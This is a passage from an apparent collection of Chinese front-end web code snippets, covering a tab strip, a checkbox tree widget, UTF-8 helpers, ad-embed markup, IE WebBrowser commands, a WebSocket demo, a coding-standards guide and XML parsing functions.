	border-bottom-style: solid;
	border-color: #ffffff;
	border-right-color: #000000;
	padding-top: 5px;
	padding-bottom: 4px;
	padding-left: 8px;
	padding-right: 8px;
	text-align: center;
	font-size: 8pt;
	font-family: arial;
	cursor: default;
}

.tabBody
{
	visibility: hidden;
	border-style: solid;
	border-width: 2px;
	border-top-width: 0px;
	border-left-color: #ffffff;
	border-right-color: #000000;
	border-bottom-color: #000000;
	border-top-color: #000000;
}

.tabDiv
{
	visibility: visible;
	border-style: solid;
	border-width: 1px;	
	margin-left: 10px; 
	margin-right: auto; 
	position: relative;
}

.tabLabel
{
	position: absolute; 
	font-family: arial;
	font-size: 10pt;
	font-weight: bold;
	color: #ff0000;
}
</style>
</head>
<body bgcolor="#d4d0c8" onload='initializeTabStripPage()'>
	<form id="form1">
		<table id="tabsTable" class="tabTable" cellspacing="0">
			<tr id="tabTops" style="height: 5px;">
				<td id="tabtop1" class="tabTopFiller" colspan="2"/><td/>
				<td id="tabtop2" class="tabTopFiller"/><td/>
				<td id="tabtop3" class="tabTopFiller"/><td/>
			</tr>
			<tr id="tabButtons">
				<td id="leftFiller" class="tabLeftFiller" style="width: 3px;"/>
				<td id="1" class="tabButton" style="width: 58px;" onclick='showTab(this.id)'>
					Tab Button
				</td>
				<td class="tabRightFiller"/>
				<td id="2" class="tabButton" style="width: 87px;" onclick='showTab(this.id)'>
					Wider Tab Button
				</td>
				<td class="tabRightFiller"/>
				<td id="3" class="tabButton" style="width: 38px;" onclick='showTab(this.id)'>
					Button
				</td>
				<td class="tabRightFiller"/>
			</tr>
			<tr>
				<td id="tabBody" class="tabBody">
					<input id="hidCurrentTab" type="hidden" value="1"/> 
				</td>
			</tr>
		</table>
		<br />

		<div id="tab1" class="tabDiv" style="height: 150px; width:470px;">
			This is Tab one
		</div><br />
		
		<div id="tab2" class="tabDiv" style="height: 150px; width:470px;">
			This is Tab two
		</div><br />
		
		<div id="tab3" class="tabDiv" style="height: 150px; width:470px;">
			This is Tab three
		</div><br />
	</form>
</body>
</html>


#T=Tree CheckBox
 
<!doctype html>
<title>树 by 司徒正美</title>
<meta charset="utf-8"/>
<meta name="keywords" content="树 by 司徒正美" />
<meta name="description" content="树 by 司徒正美" />
<h2>树 by 司徒正美</h2>
<script type="text/javascript">
  Tree = function(){
    this.path = "http://images.cnblogs.com/cnblogs_com/rubylouvre/205314/o_";
    this.name = "tree";
    this.id = + new Date + parseInt(Math.random()*100000);
    this.initialize.apply(this, arguments);
  }
  Tree.prototype = {
    constructor : Tree,
    initialize : function(config){
      var me = this, renderTo = config.renderTo;
      me.tree = config.data;
      me.container = ((typeof renderTo === "string") ?
        document.getElementById(renderTo) : renderTo) || document.body;
      me.panel = document.createElement("div");
      me.panel.setAttribute("id","tree" + me.id)
      me.container.insertBefore(me.panel,null);
      var id = "#"+me.panel.id;

      var sheet = document.createElement('style');
      sheet.type = 'text/css';
      document.getElementsByTagName('head')[0].appendChild(sheet);
      var bg = "background:transparent url("+me.path;
      var cssCode = id +" {font-size:12px;}\n" +
        id+" img {border:0;vertical-align: middle;}\n" +
        id+" span {vertical-align: bottom;}\n"+
        id+" .line {padding-left:18px;"+bg+"line.gif) repeat-y 0 0;}\n"+
        id+" .blank {margin-left:18px;}\n"+
        id+" img.collapse {padding-right:18px;"+bg+"folder.gif) no-repeat right center;}\n"+//控制枝节点的装饰图标（闭合）
      id+" img.unfold {padding-right:18px;"+bg+"folderopen.gif) no-repeat right center;}\n"+//控制枝节点的装饰图标（展开）
      id+" img.root {padding-right:18px;"+bg+"root.gif) no-repeat right center;}\n"+ //控制根节点的装饰图标
      id+" img.leaf {padding-right:18px;"+bg+"leaf.gif) no-repeat right center;}\n" //控制叶节点的装饰图标
      if(!+"\v1"){
        sheet.styleSheet.cssText = cssCode
      }else if(/a/[-1]=='a'){
        sheet.innerHTML = cssCode
      }else{
        sheet.appendChild(document.createTextNode(cssCode));
      }

      //添加根节点
      var icon = me.makeImage("nolines_plus","collapse root")
      var checkbox0 = me.makeImage("checkbox_0","checkbox_0");
      me.panel.innerHTML = me.makeTree(me.tree[0][0],"b",0,icon+checkbox0, me.tree[0][2]);
      me.childs = [];
      me.checks = [];//由来装载点击数
      me.panel.onclick = function(e){
        e = e || window.event;
        var node = e.srcElement ? e.srcElement : e.target;
        var current = node.parentNode;
        var currentIndex = current.getAttribute("index");
        var currentPrefix = current.getAttribute("prefix");
        var currentLevel = current.getAttribute("level");
        var subtree = me.getSubtree(currentIndex);
        var children = current.children[3];
        //添加子树集合
        //存在子树并且没有添加时才添加
        if(subtree && !children){
          children = document.createElement("div");
          var childs = [];
          for(var i=0,length = subtree.length;i<length;i++){
            var isLimb = me.hasSubtree(subtree[i][0]);
            var isLast = (i == subtree.length - 1);
            var prefix = isLast ? "blank" : "line";
            icon = isLast ? "plusbottom" : "plus";
            if(isLimb){
              icon = me.makeImage(icon,"collapse limb");//枝节点前面的装饰图标
            }else{
              icon = icon.replace(/plus/, "join");//叶子节点前面的连线图标
              icon = me.makeImage(icon,"leaf");//叶子节点前面的装饰图标
            }
            childs.push(subtree[i][0])
            children.innerHTML += me.makeTree(subtree[i][0],prefix,+currentLevel+1,icon+checkbox0,subtree[i][2])
          }
          me.childs[currentIndex] = childs;
          children.className = (currentPrefix == "line") ? "line": "blank";
          current.insertBefore(children,null);
        }

        if(/collapse/.test(node.className)){//如果点击是加号或减号图标
          node.src = node.src.replace(/plus/,"minus");//改变连线图标
          node.className = node.className.replace("collapse","unfold");//改变装饰图标
          children &&(children.style.display = "block");
        }else if(/unfold/.test(node.className)){
          node.src = node.src.replace(/minus/,"plus");//改变连线图标
          node.className = node.className.replace("unfold","collapse");//改变装饰图标
          children &&(children.style.display = "none");
        }

        if(/checkbox/.test(node.className)){//如果单击的是checkbox图标
          var checked = me.isChecked(node);//如果是true则--，如果是false则++
          me.setPriorCheckbox(current,checked);//一开始肯定是checkbox，返回false
          me.setJuniorCheckbox(current,checked)
        }
      }
    },
    setJuniorCheckbox : function(node,/*Boolean*/checked){
      var checkbox = node.children[1];
      var replaceCheckbox = checked ? "checkbox_0" :"checkbox_1";
      checkbox.src = checkbox.src.replace(/checkbox_\d/,replaceCheckbox);
      checkbox.className  = replaceCheckbox;
      var index = node.getAttribute("index");
      if(!!this.childs[index]){
        var length = this.childs[index].length;
        this.checks[index] = checked ? length : 0;
        if(length > 0){
          var children = node.children[3].children;
          while(--length >= 0){
            this.setJuniorCheckbox(children[length],checked)
          }
        }
      }
    },
    setPriorCheckbox :function(node,/*Boolean*/checked){//设置上一级树的checkbox
      var index = node.getAttribute("index");
      var prior = node.parentNode.parentNode;
      var priorIndex = this.tree[index][1];
      var priorCheckbox = prior.children[1];
      var priorLevel = prior.getAttribute("level");
      var priorCount = this.checks[priorIndex] || 0;
      checked ? priorCount-- : priorCount++;
      (priorCount < 0) && (priorCount = 0)
      this.checks[priorIndex] = priorCount;
      if(!!priorCheckbox){
        //当priorIndex等于-1时,
        //priorCheckbox不存在
        //me.childs[priorIndex]为undefined，不存在长度
        checked = (priorCount == this.childs[priorIndex].length);
        var replaceCheckbox = checked ? "checkbox_1" : "checkbox_2";
        //checkbox_1为全选，checkbox_2为非全选
        //全选，则让上级++，即让checked为false
        priorCheckbox.src =  priorCheckbox.src.replace(/checkbox_\d/,replaceCheckbox);//????????
        priorCheckbox.className  = replaceCheckbox;
      }
      if(priorLevel > 0){ //根节点没有priorCheckbox，且priorLevel等于-1
        this.setPriorCheckbox(prior,checked);
      }
    },
    isChecked : function(node){//如果是checkbox_0返回false，checkbox_1与checkbox_2返回true
      return node.src.slice(-5,-4) > 0;
    },
    makeImage : function(image){
      var status ="";
      if(arguments[1] != null){
        status = "class='" + arguments[1] +"'";
      }
      return "<img src='"+this.path+image+".gif' "+status+" />"
    },

    makeTree : function(index,prefix,level,images,text){
      var builder = [];
      builder.push("<div index='");
      builder.push(index);
      builder.push("' prefix='")
      builder.push(prefix);
      builder.push("' level='")
      builder.push(level);
      builder.push("'>");
      builder.push(images);
      builder.push("<span>");
      builder.push(text);
      builder.push("</span></div>")
      return builder.join('');
    },
    hasSubtree : function (p){
      var tree = this.tree;
      for(var i = 0,length = tree.length;i < length; i++){
        if(this.tree[i][1] == p){
          return true;
        };
      };
      return false;
    },
    getSubtree : function (p){
      var subtree = [],tree = this.tree;
      for(var i = 0,length = tree.length;i < length; i++){
        if(tree[i][1] == p){
          subtree.push(tree[i]);
        };
      };
      return subtree
    }
  }

  var data = [
    [0,-1,"前台技术"],
    [1,0,"表现层"],
    [2,1,"CSS"],
    [3,2,"CSS资源"],
    [4,2,"CSS3前瞻"],
    [5,1,"web标准知识"],
    [6,1,"图形"],
    [7,6,"SVG"],
    [8,6,"VML"],
    [9,6,"canvas"],
    [10,0,"结构层"],
    [11,10,"HTML"],
    [12,10,"微格式"],
    [13,10,"XML"],
    [14,13,"XPath"],
    [15,0,"行为层"],
    [16,15,"core"],
    [17,16,"变量与参数"],
    [18,16,"对象与继承"],
    [19,16,"函数与闭包"],
    [20,16,"算法"],
    [21,16,"高级技术"],
    [22,21,"跨域请求"],
    [23,21,"提速技术"],
    [24,21,"本地存储"],
    [25,21,"函数劫持"],
    [26,16,"框架设计"],
    [27,26,"Ext"],
    [28,26,"dojo"],
    [29,26,"mootools"],
    [30,15,"Ajax"],
    [31,15,"DOM"],
    [32,15,"BOM"]
  ]

  window.onload = function(){
    var tree = new Tree({renderTo:"test",data:data});
  }

</script>
<div id="test"></div>

#T=URL => Link <a href
function replaceURLWithHTMLLinks(text) {
      /*
        Example:
 
            >>> GateOne.Utils.replaceURLWithHTMLLinks('Downloading http://foo.bar.com/some/file.zip');
            "Downloading <a href="http://foo.bar.com/some/file.zip">http://foo.bar.com/some/file.zip</a>"
        */
        var exp = /(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig;
        return text.replace(exp,"<a href="$1">$1</a>");
    }
#T=utf8
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft?">
	<meta name="Author" content="EditPlus?,Microshaoft?">
	<meta name="Keywords" content="EditPlus?,Microshaoft?">
	<meta name="Description" content="EditPlus?,Microshaoft?">
	<title>Document</title>
</head>
<body>
	<script type="text/javascript">
	<!--
		function encode_utf8(s) {
			return unescape(encodeURIComponent(s));
		}

		function decode_utf8(s) {
			return decodeURIComponent(escape(s));
		}
		alert(decode_utf8(encode_utf8('于溪玥')));
	//-->
	</script>
</body>
</html>

#T=utf8 解码
function utf8_decode(str_data){
    var tmp_arr = [],i = 0,ac = 0,c1 = 0,c2 = 0,c3 = 0;str_data += '';
    while (i < str_data.length) {
        c1 = str_data.charCodeAt(i);
        if (c1 < 128) {
            tmp_arr[ac++] = String.fromCharCode(c1);
            i++;
        } else if (c1 > 191 && c1 < 224) {       
            c2 = str_data.charCodeAt(i + 1);
            tmp_arr[ac++] = String.fromCharCode(((c1 & 31) << 6) | (c2 & 63));
            i += 2;
        } else {
            c2 = str_data.charCodeAt(i + 1);
            c3 = str_data.charCodeAt(i + 2);
            tmp_arr[ac++] = String.fromCharCode(((c1 & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
            i += 3;
        }
    } 
    return tmp_arr.join('');
}
#T=vnet 广告
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> new document </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />

<style type="text/css">
<!--
body,td,th {
	font-family: 宋体;
	font-size: 12px;
	color: #000000;
}
body {
	background-color: #FFFFFF;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.newbg {
	BACKGROUND: url(/tres/Vnet/imges/2008index_bg.jpg) #fff no-repeat center top
}
-->
</style>

 </head>

 <body>
<script language='javascript' src='http://rad.Vnet.cn/AdFocusDelivery.aspx?website=vnetmt&place=SY_JDT&location=vnet' type='text/javascript'></script>
<script language='javascript' src='http://rad.vnet.cn/AdDelivery.aspx?website=vnetmt&place=SY_YS&location=vnetmt' type='text/javascript'></script>


<script type="text/javascript" src="http://i3.sinaimg.cn/home/sinaflash.js"></script>

<script language="javascript" type="text/javascript">
//<![CDATA[
var adflashbig = 'http://d1.sina.com.cn/cg/test/2008/750x300.swf';
var adflash100100 = 'http://d1.sina.com.cn/cg/test/2008/100X100.gif';
var adurl100100 = 'http://sina.allyes.com/main/adfclick?db=sina&bid=127067,161799,166747&cid=0,0,0&sid=153964&advid=4865&camid=21150&show=ignore&url=http://www.k-touch.cn';
var float_stream_width = 750; // 流媒体宽度 根据需要修改
var float_stream_height = 300; // 流媒体高度 根据需要修改
var float_stream_top = 98; // 流媒体上边距 根据需要修改
var float_stream_left = -1; // 流媒体左边距 根据需要修改 -1 = 默认居中	
var ifcl_stylebigBg= -1; // 透明素材设置为-1 非透明素材设置为1
//]]>
</script>
<script language="javascript" type="text/javascript" src="http://d1.sina.com.cn/ads/floatlmt/v3/lmt_v3.js"></script>

 </body>
</html>


#T=WebBrowser.ExecWB
■打开■ 
<input name=Button onClick=document.all.WebBrowser.ExecWB(1,1) type=button value=打开> 
<OBJECT classid=CLSID:8856F961-340A-11D0-A96B-00C04FD705A2 height=0 id=WebBrowser width=0></OBJECT> 
■另存为■ 
<input name=Button onClick=document.all.WebBrowser.ExecWB(4,1) type=button value=另存为><OBJECT classid=CLSID:8856F961-340A-11D0-A96B-00C04FD705A2 height=0 id=WebBrowser width=0></OBJECT> 
■属性■ 
<input name=Button onClick=document.all.WebBrowser.ExecWB(10,1) type=button value=属性><OBJECT classid=CLSID:8856F961-340A-11D0-A96B-00C04FD705A2 height=0 id=WebBrowser width=0></OBJECT> 
■打印■ 
<input name=Button onClick=document.all.WebBrowser.ExecWB(6,1) type=button value=打印><OBJECT classid=CLSID:8856F961-340A-11D0-A96B-00C04FD705A2 height=0 id=WebBrowser width=0></OBJECT> 
■页面设置■ 
<input name=Button onClick=document.all.WebBrowser.ExecWB(8,1) type=button value=页面设置><OBJECT classid=CLSID:8856F961-340A-11D0-A96B-00C04FD705A2 height=0 id=WebBrowser width=0></OBJECT> 
■刷新■ 
<input type=button value=刷新 name=refresh onclick="window.location.reload()"> 
■导入收藏■ 
<input type="button" name="Button" value="导入收藏夹" onClick=window.external.ImportExportFavorites(true,);> 
■导出收藏■ 
<input type="button" name="Button3" value="导出收藏夹" onClick=window.external.ImportExportFavorites(false,);> 
■加入收藏■ 
<INPUT name=Button2 onclick="window.external.AddFavorite(location.href, document.title)" type=button value=加入收藏夹> 
■整理收藏夹■ 
<INPUT name=Submit2 onclick="window.extern 



WebBrowser.ExecWB(1,1) 打开 
WebBrowser.ExecWB(2,1) 关闭现在所有的IE窗口，并打开一个新窗口 
WebBrowser.ExecWB(4,1) 保存网页 
WebBrowser.ExecWB(6,1) 打印 
WebBrowser.ExecWB(7,1) 打印预览 
WebBrowser.ExecWB(8,1) 打印页面设置 
WebBrowser.ExecWB(10,1) 查看页面属性 
WebBrowser.ExecWB(15,1) 好像是撤销，有待确认 
WebBrowser.ExecWB(17,1) 全选 
WebBrowser.ExecWB(22,1) 刷新 
WebBrowser.ExecWB(45,1) 关闭窗体无提示 

#T=WebSocket Node.js
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
	<style>
		.kuang{text-align: center;margin-top:200px;}
		#mess{text-align: center}
		.value{width: 200px;height:200px;border:1px solid;text-align: center;line-height: 200px;display: inline-block;}
	</style>
</head>
<body>
	<div id="mess">正在连接...</div>
	<div class="kuang">
		<div class="value" id="value1">小明小明</div>
		<div class="value" id="value2">大胸大胸</div>
		<div class="value" id="value3">小张小张</div>
	</div>
	<script type="text/javascript">
	<!--
		//Server Side Node.js
		var ws = require("nodejs-websocket");
		console.log("开始建立连接...")
		var game1 = null,game2 = null , game1Ready = false , game2Ready = false;
		var server = ws.createServer(function(conn){
			conn.on("text", function (str) {
				console.log("收到的信息为:"+str)
				if(str==="game1"){
					game1 = conn;
					game1Ready = true;
					conn.sendText("success");
				}
				if(str==="game2"){
					game2 = conn;
					game2Ready = true;
				}

				if(game1Ready&&game2Ready){
					game2.sendText(str);
				}

				conn.sendText(str)
			})
			conn.on("close", function (code, reason) {
				console.log("关闭连接")
			});
			conn.on("error", function (code, reason) {
				console.log("异常关闭")
			});
		}).listen(8001)
		console.log("WebSocket建立完毕")
	//-->
	</script>

	<script>
		var mess = document.getElementById("mess");
		if(window.WebSocket){
			var ws = new WebSocket('ws://192.168.17.80:8001');

			ws.onopen = function(e){
				console.log("连接服务器成功");
				ws.send("game1");
			}
			ws.onclose = function(e){
				console.log("服务器关闭");
			}
			ws.onerror = function(){
				console.log("连接出错");
			}

			ws.onmessage = function(e){
				mess.innerHTML = "连接成功"
				document.querySelector(".kuang").onclick = function(e){
					var time = new Date();
					ws.send(time + "  game1点击了“" + e.target.innerHTML+"”");
				}
			}
		}
	</script>
</body>
</html>
#T=Web前端开发规范文档你需要知道的事
Web前端开发规范文档你需要知道的事
规范目的
为提高团队协作效率, 便于后台人员添加功能及前端后期优化维护, 输出高质量的文档, 特制订此文档. 本规范文档一经确认, 前端开发人员必须按本文档规范进行前台页面开发. 本文档如有不对或者不合适的地方请及时提出, 经讨论决定后方可更改.
基本准则
符合web标准, 语义化html, 结构表现行为分离, 兼容性优良. 页面性能方面, 代码要求简洁明了有序, 尽可能的减小服务器负载, 保证最快的解析速度.
文件规范
1. html, css, js, images文件均归档至<系统开发规范>约定的目录中;
2. html文件命名: 英文命名, 后缀.htm. 同时将对应界面稿放于同目录中, 若界面稿命名为中文, 请重命名与html文件同名, 以方便后端添加功能时查找对应页面;
3. css文件命名: 英文命名, 后缀.css. 共用base.css, 首页index.css, 其他页面依实际模块需求命名.;
4. Js文件命名: 英文命名, 后缀.js. 共用common.js, 其他依实际模块需求命名.
html书写规范
1. 文档类型声明及编码: 统一为html5声明类型; 编码统一为, 书写时利用IDE实现层次分明的缩进;
2. 非特殊情况下样式文件必须外链至…之间;非特殊情况下JavaScript文件必须外链至页面底部;
3. 引入样式文件或JavaScript文件时, 须略去默认类型声明.
4. 引入JS库文件, 文件名须包含库名称及版本号及是否为压缩版, 比如jquery-1.7.1.min.js; 引入插件, 文件名格式为库名称+插件名称, 比如jQuery.cookie.js;
5. 所有编码均遵循xhtml标准, 标签 & 属性 & 属性命名 必须由小写字母及下划线数字组成, 且所有标签必须闭合; 属性值必须用双引号包括;
6. 充分利用无兼容性问题的html自身标签, 比如span, em, strong, optgroup, label,等等; 需要为html元素添加自定义属性的时候, 首先要考虑下有没有默认的已有的合适标签去设置, 如果没有, 可以使用须以”data-”为前缀来添加自定义属性，避免使用”data:”等其他命名方式;
7. 语义化html, 如 标题根据重要性用h(同一页面只能有一个h1), 段落标记用p, 列表用ul, 内联元素中不可嵌套块级元素;
8. 尽可能减少div嵌套
9. 书写链接地址时, 必须避免重定向，例如：href=”http://www.example.com/”, 即须在URL地址后面加上“/”；
10. 在页面中尽量避免使用style属性,即style=”…”;
11. 必须为含有描述性表单元素(input, textarea)添加label
12. 能以背景形式呈现的图片, 尽量写入css样式中;
13. 重要图片必须加上alt属性; 给重要的元素和截断的元素加上title;
14. 给区块代码及重要功能(比如循环)加上注释, 方便后台添加功能;
15. 特殊符号使用: 尽可能使用代码替代: 比如 <(<) & >(>) & 空格( ) & ?(?) 等等;
16. 书写页面过程中, 请考虑向后扩展性;
17. class & id 参见 css书写规范.
css书写规范
1. 编码统一为utf-8;
2. 协作开发及分工: i会根据各个模块, 同时根据页面相似程序, 事先写好大体框架文件, 分配给前端人员实现内部结构&表现&行为; 共用css文件base.css由i书写, 协作开发过程中, 每个页面请务必都要引入, 此文件包含reset及头部底部样式, 此文件不可随意修改;
3. class与id的使用: id是唯一的并是父级的, class是可以重复的并是子级的, 所以id仅使用在大的模块上, class可用在重复使用率高及子级中; id原则上都是由我分发框架文件时命名的, 为JavaScript预留钩子的除外;
4. 为JavaScript预留钩子的命名, 请以 js_ 起始, 比如: js_hide, js_show;
5. class与id命名: 大的框架命名比如header/footer/wrapper/left/right之类的在2中由i统一命名.其他样式名称由 小写英文 & 数字 & _ 来组合命名, 如i_comment, fontred, width200; 避免使用中文拼音, 尽量使用简易的单词组合; 总之, 命名要语义化, 简明化.
6. 规避class与id命名(此条重要, 若有不明白请及时与i沟通):
	a） 通过从属写法规避, 示例见d;
	b）取父级元素id/class命名部分命名, 示例见d;
	c）重复使用率高的命名, 请以自己代号加下划线起始, 比如i_clear;
	d）a,b两条, 适用于在2中已建好框架的页面, 如, 要在2中已建好框架的页面代码中加入新的div元素
7. css属性书写顺序, 建议遵循: 布局定位属性–>自身属性–>文本属性–>其他属性. 此条可根据自身习惯书写, 但尽量保证同类属性写在一起. 属性列举: 布局定位属性主要包括: display & list-style & position（相应的 top,right,bottom,left） ＆ float & clear ＆ visibility ＆ overflow； 自身属性主要包括: width & height & margin & padding & border & background; 文本属性主要包括：color & font & text-decoration & text-align & vertical-align & white- space & 其他 & content; 我所列出的这些属性只是最常用到的, 并不代表全部;
8. 书写代码前, 考虑并提高样式重复使用率;
9. 充分利用html自身属性及样式继承原理减少代码量, 比如:
● 这儿是标题列表2012-04- 24
定义
ul.list li{position:relative} ul.list li span{position:absolute; right:0}
即可实现日期居右显示
10. 样式表中中文字体名, 请务必转码成unicode码, 以避免编码错误时乱码;
11. 背景图片请尽可能使用sprite技术, 减小http请求, 考虑到多人协作开发, sprite按模块制作;
12. 使用table标签时(尽量避免使用table标签), 请不要用width/ height/cellspacing/cellpadding等table属性直接定义表现, 应尽可能的利用table自身私有属性分离结构与表现 , 如thead,tr,th,td,tbody,tfoot,colgroup,scope; (cellspaing及cellpadding的css控制方法:table{border:0;margin:0;border-collapse:collapse;} table th, table td{padding:0;}, base.css文件中我会初始化表格样式)
13. 如何可以请少使用兼容;
14. 用png图片做图片时, 要求图片格式为png-8格式,若png-8实在影响图片质量或其中有半透明效果, 请为ie6单独定义背景:
_background:none;_filter:progid:DXImageTransform.Microsoft.AlphaImageLoader (sizingMethod=crop, src=’img/bg.png’);
15. 避免兼容性属性的使用, 比如text-shadow || css3的相关属性;
16. 减少使用影响性能的属性, 比如position:absolute || float ;
17. 必须为大区块样式添加注释, 小区块适量注释;
18. 代码缩进与格式: 建议单行书写, 可根据自身习惯, 后期优化会统一处理;
JavaScript书写规范
1. 文件编码统一为utf-8, 书写过程过, 每行代码结束必须有分号; 原则上所有功能均根据XXX项目需求原生开发, 以避免网上down下来的代码造成的代码污染(沉冗代码 || 与现有代码冲突 || …);
2. 库引入: 原则上仅引入jQuery库, 若需引入第三方库, 须与团队其他人员讨论决定;
3. 变量命名: 驼峰式命名. 原生JavaScript变量要求是纯英文字母, 首字母须小写, 如iTaoLun;
jQuery变量要求首字符为’_’, 其他与原生JavaScript 规则相同, 如: _iTaoLun;
另, 要求变量集中声明, 避免全局变量.
4. 类命名: 首字母大写, 驼峰式命名. 如 ITaoLun;
5. 函数命名: 首字母小写驼峰式命名. 如iTaoLun();
6. 命名语义化, 尽可能利用英文单词或其缩写;
7. 尽量避免使用存在兼容性及消耗资源的方法或属性, 比如eval_r() & innerText;
8. 后期优化中, JavaScript非注释类中文字符须转换成unicode编码使用, 以避免编码错误时乱码显示;
9. 代码结构明了, 加适量注释. 提高函数重用率;
10. 注重与html分离, 减小reflow, 注重性能.
图片规范
1. 所有页面元素类图片均放入img文件夹, 测试用图片放于img/demoimg文件夹;
2. 图片格式仅限于gif || png || jpg;
3. 命名全部用小写英文字母 || 数字 || _ 的组合，其中不得包含汉字 || 空格 || 特殊字符；尽量用易懂的词汇, 便于团队其他成员理解; 另, 命名分头尾两部分, 用下划线隔开, 比如ad_left01.gif || btn_submit.gif;
4. 在保证视觉效果的情况下选择最小的图片格式与图片质量, 以减少加载时间;
5. 尽量避免使用半透明的png图片(若使用, 请参考css规范相关说明);
6. 运用css sprite技术集中小的背景图或图标, 减小页面http请求, 但注意, 请务必在对应的sprite psd源图中划参考线, 并保存至img目录下.
注释规范
1. html注释: 注释格式 , ‘–’只能在注释的始末位置,不可置入注释文字区域;
2. css注释: 注释格式 ;
3. JavaScript注释, 单行注释使用’//这儿是单行注释’ ,多行注释使用 ;
开发及测试工具约定
建议使用WebStorm||Aptana || Dw || Vim , 亦可根据自己喜好选择, 但须遵循如下原则:
1. 不可利用IDE的视图模式’画’代码;
2. 不可利用IDE生成相关功能代码, 比如Dw内置的一些功能js;
3. 编码必须格式化, 比如缩进;
测试工具: 前期开发仅测试FireFox & IE6 & IE7 & IE8 & IE9 & Opera & Chrome & Safari;
其他规范
1. 开发过程中严格按分工完成页面, 以提高css复用率, 避免重复开发;
2. 减小沉冗代码, 书写所有人都可以看的懂的代码. 简洁易懂是一种美德. 为用户着想, 为服务器着想.
#T=XDomainRequest XMLHttpRequest Level 2
 
<!doctype html>
<html>
<head>
	<title>XMLHttpRequest Level 2 by 司徒正美</title>
	<meta charset="utf-8"/>
	<meta content="IE=8" http-equiv="X-UA-Compatible"/>
	<meta name="keywords" content="XMLHttpRequest Level 2 by 司徒正美" />
	<meta name="description" content="XMLHttpRequest Level 2 by 司徒正美" />
	<script type="text/javascript" charset="utf-8">
		if ("1"[0])
		{//只允许IE8与较新的标准浏览器进入下面逻辑
			var xhr = window.XDomainRequest ? new XDomainRequest : new XMLHttpRequest;
			try
			{
				xhr.onload = function()
								{
									//由于返回的JSON过长，我们在演示时把它截短一些
									alert([xhr.responseText.slice(0,1000),xhr]);
								};
				xhr.open("GET","http://ss-o.net/json/wedataAutoPagerize.json");
				xhr.send();
			}
			catch (e)
			{
				alert("请求失败： "+e.message);
			}
		}
	</script>
</head>
<body>
	<h1>XMLHttpRequest Level 2 by 司徒正美</h1>
	<p><a href="http://ss-o.net/json/wedataAutoPagerize.json">http://ss-o.net/json/wedataAutoPagerize.json</a></p>
	<p><a href="http://ss-o.net/json/wedataLDRize.json">http://ss-o.net/json/wedataLDRize.json</a></p>
</body>
</html>

#T=xml javascript处理的函数
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<script type="text/javascript">
<!--
	// author: yangyi (yangyi.cn.gz@gmail.com)

// Based on <http://www.w3.org/TR/2000/REC-DOM-Level-2-Core-20001113/core.html#ID-1950641247> (copy from ajaxslt)
var DOM_ELEMENT_NODE = 1;
var DOM_ATTRIBUTE_NODE = 2;
var DOM_TEXT_NODE = 3;
var DOM_CDATA_SECTION_NODE = 4;
var DOM_ENTITY_REFERENCE_NODE = 5;
var DOM_ENTITY_NODE = 6;
var DOM_PROCESSING_INSTRUCTION_NODE = 7;
var DOM_COMMENT_NODE = 8;
var DOM_DOCUMENT_NODE = 9;
var DOM_DOCUMENT_TYPE_NODE = 10;
var DOM_DOCUMENT_FRAGMENT_NODE = 11;
var DOM_NOTATION_NODE = 12;

/**
 * http://developer.mozilla.org/en/docs/DOMParser
 * 接受一段xml，解析成为xml document对象
 * 调用时可用try{}catch(e){}捕捉错误，错误对象具有parser xml message属性
 * @param   {String}    xml string
 * @return  {Object}    xml document object
 */
function xmlDocument(/* String */xmlString){
    var doc = null;

    if (window.ActiveXObject){
        var ActiveIds = ['MSXML2.XMLDOM', 'Microsoft.XMLDOM', 'MSXML.XMLDOM', 'MSXML3.XMLDOM'];
        for (var len = ActiveIds.length, i = 0; i < len; i++){
            var id = ActiveIds[i];
            try{
                var doc = new ActiveXObject(id);
                doc.async = false;
                doc.setProperty('SelectionLanguage', 'XPath');
                doc.loadXML(xmlString);
                break;
            }catch (e){}finally{
                if (doc && doc.parseError && doc.parseError.errorCode != 0){
                    throw {parser:'MSXML', message:doc.parseError.reason, xml:xmlString, func:'xmlDocument'};
                }
            }
        }
    }else if (typeof DOMParser != 'undefined'){
        var parser = new DOMParser();
        var doc = parser.parseFromString(xmlString, 'text/xml');
        if (doc.documentElement.nodeName == 'parsererror'){
            throw {parser:'DOMParser', message:doc.documentElement.firstChild.nodeValue, xml:xmlString, func:'xmlDocument'};
        }
    }else{ return false; }

    return doc;
}

/**
 * 获取指定节点或文档对象的xml内容
 * port from ajaxslt xmlText()
 * @param   {Object}    xml DOM Node or xml Document
 * @return  {String}    xml string
 */
function xmlText(/* Document|Element */node){
    if (typeof node == 'string'){ return node; }

    if (node.innerXML){
        return node.innerXML;
    }else if (node.xml){
        return node.xml;
    }else if (typeof XMLSerializer != 'undefined'){
        return (new XMLSerializer()).serializeToString(node);
    }else{ return false; }
}

/**
 * 获取所有节点的内容
 * port from ajaxslt xmlValue()
 * @param   {Object}    xml DOM Node or xml Document
 * @return  {String}
 */
function xmlValue(/* Document|Element */node){
    var val = '';
    if (node.nodeType == DOM_TEXT_NODE ||
        node.nodeType == DOM_CDATA_SECTION_NODE ||
        node.nodeType == DOM_ATTRIBUTE_NODE){
        val += node.nodeValue;
    }else if (node.nodeType == DOM_ELEMENT_NODE ||
              node.nodeType == DOM_DOCUMENT_NODE ||
              node.nodeType == DOM_DOCUMENT_FRAGMENT_NODE){
        for (var len = node.childNodes.length, i = 0; i < len; i++){
